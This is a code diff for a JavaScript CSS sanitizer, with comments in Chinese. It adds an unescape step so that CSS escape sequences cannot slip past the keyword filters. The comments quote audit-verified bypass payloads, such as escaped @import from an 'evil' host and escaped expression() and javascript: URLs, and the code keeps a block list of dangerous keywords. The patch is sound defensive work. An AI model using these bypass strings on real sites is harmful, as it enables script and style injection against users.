@@ -42,9 +42,40 @@ export function cut(s, max) {
   return a.length <= max ? a.join('') : a.slice(0, max).join('');
 }
 
+// CSS 的逸出序列：瀏覽器在解析**之前**就會把它們還原，所以「先過濾關鍵字、
+// 再交給瀏覽器」的順序是錯的。
+//
+// ⚠ 稽核實測（Chrome 真的載進外部樣式表）：
+//     @im\port url(//evil/x.css);      瀏覽器看到的是 @import
+//     @\69 mport url(//evil/x.css);    \69 就是 i
+//     a:expre\73 sion(alert(1))        \73 就是 s
+//     url(java\73 cript:alert(1))
+// 下面每一條 replace 都被這招整組繞過去，連 <> 都可以寫成 \3C \3E 溜進來，
+// 那就是任意 HTML 注入。
+//
+// 正解是先還原、再過濾，而且**輸出還原後的字串**——過濾到的東西就是瀏覽器
+// 會看到的東西，中間沒有第二次解讀的空間。
+//
+// 還原完之後剩下的反斜線一律拿掉：那只可能來自輸入寫的 \\，還原成一個
+// \ 印出去又會變成新的逸出開頭（輸入 \\3C 還原成 \3C，瀏覽器再還原一次
+// 就是 <）。合法的 CSS 幾乎用不到裸反斜線，拿掉不影響正常使用者。
+function cssUnescape(s){
+  return s.replace(/\\(?:([0-9a-fA-F]{1,6})(?:\r\n|[ \n\r\t\f])?|(\r\n|[\n\r\f])|([\s\S]))/g,
+    (m, hex, nl, ch) => {
+      if (hex !== undefined){
+        const cp = parseInt(hex, 16);
+        // 0、代理對區間、超出 Unicode 範圍：照規格換成 U+FFFD
+        if (!cp || cp > 0x10FFFF || (cp >= 0xD800 && cp <= 0xDFFF)) return '\uFFFD';
+        return String.fromCodePoint(cp);
+      }
+      if (nl !== undefined) return '';   // 反斜線接換行是「行接續」，整個消失
+      return ch;
+    });
+}
+
 export function safeCss(css, max = 20000){
-  return String(css ?? '')
-    .slice(0, max)
+  return cssUnescape(String(css ?? '').slice(0, max))
+    .replace(/\\/g, '')                                     // 還原後殘留的反斜線
     .replace(/[<>]/g, '')                                   // 不可能提早關掉 <style>
     .replace(/expression\s*\(/gi, 'blocked(')
     .replace(/(javascript|vbscript|livescript)\s*:/gi, 'blocked:')
